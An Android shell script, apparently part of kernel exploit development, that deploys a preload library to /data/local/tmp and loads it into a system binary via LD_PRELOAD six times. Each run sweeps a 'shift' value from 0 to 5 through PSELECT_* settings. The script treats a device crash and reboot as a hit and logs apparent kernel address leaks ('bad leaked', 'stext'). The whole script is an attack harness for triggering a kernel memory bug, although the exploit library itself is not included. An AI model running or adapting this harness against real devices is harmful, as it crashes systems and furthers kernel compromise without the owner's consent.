#!/system/bin/sh
# mt19 sweep: SLIDE 真触发 + shift 0-5 全扫 (一次运行 6 轮, 任一 crash = 几何命中)
SRC=/sdcard/Documents/matisse_backup_essentials/preload_mt19_slidetrigger.so
DST=/data/local/tmp/preload.so
LOG=/sdcard/Documents/matisse_backup_essentials/logs/mt19_sweep.txt

echo "=== [1/4] 部署 ==="
rm -f $DST; cp $SRC $DST; sync
SRC_H=$(sha256sum $SRC | awk '{print $1}')
DST_H=$(sha256sum $DST | awk '{print $1}')
[ "$SRC_H" = "$DST_H" ] || { echo "HASH MISMATCH"; exit 1; }
echo "HASH OK"
am kill-all 2>&1 | tail -1
echo "boot_before=$(cat /proc/sys/kernel/random/boot_id)" > $LOG

echo "=== [2/4] shift 0-5 逐轮运行 ==="
for SH in 0 1 2 3 4 5; do
  echo "--- shift=$SH start $(date +%H:%M:%S)" >> $LOG
  RUNLOG=/data/local/tmp/mt19_shift$SH.out
  rm -f $RUNLOG
  timeout 130 env \
    PSELECT_SLIDE_TRIGGER=1 \
    PSELECT_TREE_PC=ffffffb0fffffff8 \
    PSELECT_TREE_LEFT=0 \
    PSELECT_SHIFT=$SH \
    PSELECT_SKIP_WARMUP=1 \
    LD_PRELOAD=$DST /system/bin/sleep 90 > $RUNLOG 2>&1
  RC=$?
  echo "shift=$SH rc=$RC" >> $LOG
  grep -a 'slide pselect returned\|mt19b: sched\|bad leaked\|stext' $RUNLOG | sed 's/\x1b\[[0-9;]*m//g' >> $LOG
  # 若崩溃重启, 脚本在这里断掉
done

echo "=== [3/4] boot_id 后 ==="
echo "boot_after=$(cat /proc/sys/kernel/random/boot_id)" >> $LOG
echo "=== DONE ===" >> $LOG
